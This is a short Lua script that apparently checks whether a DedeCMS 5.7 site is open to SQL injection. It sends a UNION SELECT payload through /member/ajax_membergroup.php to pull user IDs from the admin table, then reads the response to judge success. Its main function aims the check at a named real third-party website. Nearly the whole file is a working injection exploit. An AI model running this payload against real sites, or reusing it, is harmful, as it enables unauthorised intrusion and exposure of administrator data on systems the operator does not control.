#!/usr/local/bin/lua
--Author:Sevck
--Date:2016/7/12
--Function:Check dedecms version 5.7 SQL injection

local curl = agent.require "lcurl"
agent.load "rex_pcre"
local rex = rex_pcre

function check_dedecms(url)
	local headers={
				"Host: "..url,
				"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
				"Accept-Encoding: gzip, deflate",
				"Connection: keep-alive"
				}
	local visitable = true
	local response_html = ""
    local requester = curl.easy()
    requester:setopt_url(url..[[/member/ajax_membergroup.php?action=post&membergroup=@`\%27`%20Union%20select%20userid%20from%20`%23@__admin`%20where%201%20or%20id=@`%27`]])
    requester:setopt(curl.OPT_HEADER, true)
    requester:setopt(curl.OPT_WRITEFUNCTION, 
    function(s) 
        response_html = response_html..s 
        return true 
    end)
    requester:setopt(curl.OPT_TIMEOUT, 3)
    local tmp_code, tmp_msg = requester:perform()
    if requester:getinfo(curl.INFO_RESPONSE_CODE) == 404 then
        visitable = false
    end
	local match_flag=rex.match(response_html,[[onclick *= *.EditMemberGroup\(0\)]])
	if match_flag then
		return 1,"success"
	else
		return -1,"failed"
	end
end

function main()
	local code,msg=check_dedecms("www.interpretingchina.com")
	--local code,msg=check_dedecms("www.baidu.com")
	print(code,msg)
end
main()
